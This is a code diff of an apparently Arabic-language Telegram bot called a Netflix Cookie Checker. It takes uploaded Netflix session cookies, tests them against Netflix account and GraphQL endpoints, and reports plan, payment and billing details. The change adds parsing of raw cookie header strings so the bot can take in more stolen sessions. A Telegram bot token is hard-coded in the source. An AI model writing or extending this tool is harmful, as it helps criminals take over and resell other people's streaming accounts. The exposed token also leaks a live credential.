@@ -24,111 +24,20 @@ try:
 except ImportError:
     yaml = None
 
-# توكن البوت الخاص بك
 TELEGRAM_BOT_TOKEN = "8405233850:AAGjodPeCXW8TVX9b75oPeTzNEKFvtbW8FA"
 bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
 
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
-DEFAULT_CONFIG = {
-    "txt_fields": {
-        "name": False,
-        "email": True,
-        "max_streams": True,
-        "plan_price": True,
-        "plan": True,
-        "country": True,
-        "member_since": False,
-        "next_billing": True,
-        "extra_members": True,
-        "payment_method": True,
-        "card": False,
-        "phone": False,
-        "quality": True,
-        "hold_status": True,
-        "email_verified": False,
-        "membership_status": True,
-        "profiles": True,
-        "user_guid": False,
-    },
-    "nftoken": True,
-    "add_emojis": "webhook",
-    "notifications": {
-        "telegram": {
-            "enabled": True,
-            "bot_token": TELEGRAM_BOT_TOKEN,
-            "chat_id": "",
-            "mode": "full",
-            "plans": "all",
-        },
-    },
-    "display": {"mode": "simple"},
-    "retries": {"error_proxy_attempts": 3, "nftoken_attempts": 1},
-    "performance": {"request_timeout_seconds": 15, "fallback_account_page": True, "retry_incomplete_info": False, "nftoken_for_free": True},
-}
-
-DEFAULT_YAML_CONFIG = """txt_fields:
-  name: false
-  email: true
-  plan: true
-  country: true
-  member_since: false
-  quality: true
-  max_streams: true
-  plan_price: true
-  next_billing: true
-  payment_method: true
-  card: false
-  phone: false
-  hold_status: true
-  extra_members: true
-  email_verified: false
-  membership_status: true
-  profiles: true
-  user_guid: false
-
-nftoken: true
-add_emojis: "webhook"
-
-notifications:
-  telegram:
-    enabled: true
-    bot_token: "8405233850:AAGjodPeCXW8TVX9b75oPeTzNEKFvtbW8FA"
-    chat_id: ""
-    mode: "full"
-    plans: "all"
-
-display:
-  mode: "simple"
-
-retries:
-  error_proxy_attempts: 3
-  nftoken_attempts: 1
-
-performance:
-  request_timeout_seconds: 15
-  fallback_account_page: true
-  retry_incomplete_info: false
-  nftoken_for_free: true
-"""
-
-BANNER = """
-Netflix Cookie Checker - Complete Engine with Telegram & CLI
-"""
-
 cookies_folder = "cookies"
 output_folder = "output"
 failed_folder = "failed"
 broken_folder = "broken"
-proxy_file = "proxy.txt"
 
 os.makedirs(cookies_folder, exist_ok=True)
 os.makedirs(output_folder, exist_ok=True)
 os.makedirs(failed_folder, exist_ok=True)
 os.makedirs(broken_folder, exist_ok=True)
-
-guid_lock = threading.Lock()
-processed_emails = set()
 
 LOGIN_REQUIRED_NETFLIX_COOKIES = ("NetflixId",)
 OPTIONAL_NETFLIX_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
@@ -186,29 +95,10 @@ NFTOKEN_HEADERS = {
     "x-netflix.request.client.timezoneid": "Asia/Dhaka",
 }
 
-MONTH_ALIASES = {
-    "january": 1, "enero": 1, "janvier": 1, "januar": 1, "janeiro": 1, "ocak": 1, "يناير": 1, "جانفي": 1,
-    "february": 2, "febrero": 2, "fevrier": 2, "fevereiro": 2, "subat": 2, "فبراير": 2, "فيفري": 2,
-    "march": 3, "marzo": 3, "mars": 3, "marco": 3, "marzec": 3, "مارس": 3,
-    "april": 4, "abril": 4, "avril": 4, "أبريل": 4, "ابريل": 4,
-    "may": 5, "mayo": 5, "mai": 5, "maj": 5, "مايو": 5, "ماي": 5,
-    "june": 6, "junio": 6, "juin": 6, "يونيو": 6, "جوان": 6,
-    "july": 7, "julio": 7, "juillet": 7, "يوليو": 7, "جولية": 7,
-    "august": 8, "agosto": 8, "aout": 8, "أغسطس": 8, "اغسطس": 8,
-    "september": 9, "septiembre": 9, "setembro": 9, "سبتمبر": 9,
-    "october": 10, "octubre": 10, "outubro": 10, "أكتوبر": 10, "اكتوبر": 10,
-    "november": 11, "noviembre": 11, "novembro": 11, "نوفمبر": 11,
-    "december": 12, "diciembre": 12, "dezembro": 12, "ديسمبر": 12,
-}
-
 def decode_netflix_value(value):
     if value is None:
         return None
     cleaned = html.unescape(str(value))
-    replacements = {"\\x20": " ", "\\u00A0": " ", "\\u00a0": " ", "&nbsp;": " ", "u00A0": " "}
-    for source, target in replacements.items():
-        cleaned = cleaned.replace(source, target)
-    cleaned = cleaned.replace("\\/", "/").replace('\\"', '"').replace("\\n", " ").replace("\\t", " ")
     for _ in range(3):
         previous = cleaned
         cleaned = re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), cleaned)
@@ -228,16 +118,12 @@ def is_netflix_domain(domain):
     return "netflix." in normalized.lower()
 
 def is_netflix_cookie_entry(domain, name):
-    normalized_name = canonicalize_netflix_cookie_name(name)
-    return normalized_name in ALL_NETFLIX_COOKIE_NAMES or is_netflix_domain(domain)
+    return canonicalize_netflix_cookie_name(name) in ALL_NETFLIX_COOKIE_NAMES or is_netflix_domain(domain)
 
 def has_required_netflix_cookies(cookie_dict):
     if not isinstance(cookie_dict, dict):
         return False
-    for cookie_name in LOGIN_REQUIRED_NETFLIX_COOKIES:
-        if not decode_netflix_value(cookie_dict.get(cookie_name)):
-            return False
-    return True
+    return all(decode_netflix_value(cookie_dict.get(c)) for c in LOGIN_REQUIRED_NETFLIX_COOKIES)
 
 def split_netscape_cookie_columns(line):
     stripped = line.strip()
@@ -301,13 +187,36 @@ def extract_json_cookie_entries(content):
         })
     return entries
 
+# دعم استخراج الكوكيز من النصوص العادية (Raw Strings / Headers)
+def extract_raw_cookie_entries(content):
+    bundles = []
+    for index, line in enumerate(content.splitlines()):
+        line = line.strip()
+        if not line or line.startswith("#"):
+            continue
+        if "netflixid" in line.lower():
+            cookie_dict = {}
+            parts = re.split(r'[;\t]+', line)
+            for part in parts:
+                if "=" in part:
+                    k, v = part.split("=", 1)
+                    k_clean = canonicalize_netflix_cookie_name(k.strip())
+                    cookie_dict[k_clean] = v.strip()
+            if has_required_netflix_cookies(cookie_dict):
+                netscape_text = "\n".join(f".netflix.com\tTRUE\t/\tTRUE\t0\t{k}\t{v}" for k, v in cookie_dict.items())
+                bundles.append({
+                    "index": len(bundles) + 1,
+                    "total": 1,
+                    "netscape_text": netscape_text,
+                    "cookies": cookie_dict
+                })
+    return bundles
+
 def extract_netflix_cookie_bundles(content):
-    for extractor in (extract_json_cookie_entries, extract_netscape_cookie_entries):
-        entries = extractor(content)
-        if entries:
-            netscape_text = "\n".join(f"{e['domain']}\t{e['tail_match']}\t{e['path']}\t{e['secure']}\t{e['expires']}\t{e['name']}\t{e['value']}" for e in entries)
-            cookies_dict = {e["name"]: e["value"] for e in entries}
-            return [{"index": 1, "total": 1, "netscape_text": netscape_text, "cookies": cookies_dict}]
+    for extractor in (extract_json_cookie_entries, extract_netscape_cookie_entries, extract_raw_cookie_entries):
+        bundles = extractor(content)
+        if bundles:
+            return bundles
     return []
 
 def extract_info_from_graphql_payload(response_text):
@@ -424,7 +333,7 @@ def get_account_page(session, request_timeout=15):
 
 @bot.message_handler(commands=['start', 'help'])
 def send_welcome(message):
-    bot.reply_to(message, "أهلاً بك! أرسل ملف الكوكيز (JSON أو TXT أو ZIP) وسأقوم بفحصه بأعلى كفاءة عبر محرك الـ GraphQL وجميع الروابط.")
+    bot.reply_to(message, "مرحباً بك! أرسل ملف كوكيز (JSON أو TXT أو ZIP) وسأقوم بفحصه بأعلى كفاءة.")
 
 @bot.message_handler(content_types=['document'])
 def handle_docs(message):
@@ -432,10 +341,10 @@ def handle_docs(message):
     file_name = message.document.file_name.lower()
 
     if not (file_name.endswith('.json') or file_name.endswith('.txt') or file_name.endswith('.zip')):
-        bot.reply_to(message, "⚠️ يرجى إرسال ملف JSON أو TXT أو ZIP صالح.")
+        bot.reply_to(message, "⚠️ يرجى إرسال ملف بصيغة JSON أو TXT أو ZIP فقط.")
         return
 
-    msg = bot.reply_to(message, "⏳ جاري المعالجة وتقسيم الملفات (Bundles) باستخدام نظام الـ Queue والخيوط المتعددة...")
+    msg = bot.reply_to(message, "⏳ جاري فحص الكوكيز عبر الخيوط المتعددة ومعالجة الـ GraphQL...")
 
     try:
         downloaded_file = bot.download_file(file_info.file_path)
@@ -457,7 +366,7 @@ def handle_docs(message):
                     bundles_to_check.append((f"{file_name} [Part {b['index']}]", b))
 
         if not bundles_to_check:
-            bot.edit_message_text("⚠️ لم يتم العثور على كوكيز نتفليكس صالحة.", chat_id=message.chat.id, message_id=msg.message_id)
+            bot.edit_message_text("⚠️ لم يتم العثور على كوكيز صالحة أو الصيغة غير مدعومة.", chat_id=message.chat.id, message_id=msg.message_id)
             return
 
         task_queue = queue.Queue()
@@ -535,5 +444,5 @@ def handle_docs(message):
         bot.edit_message_text(f"⚠️ حدث خطأ أثناء المعالجة: {str(e)}", chat_id=message.chat.id, message_id=msg.message_id)
 
 if __name__ == "__main__":
-    print("[🚀] Full Netflix Checker & Telegram Bot Engine is running...")
+    print("[🚀] Telegram Bot Engine with Raw Cookie Support is running successfully...")
     bot.infinity_polling()
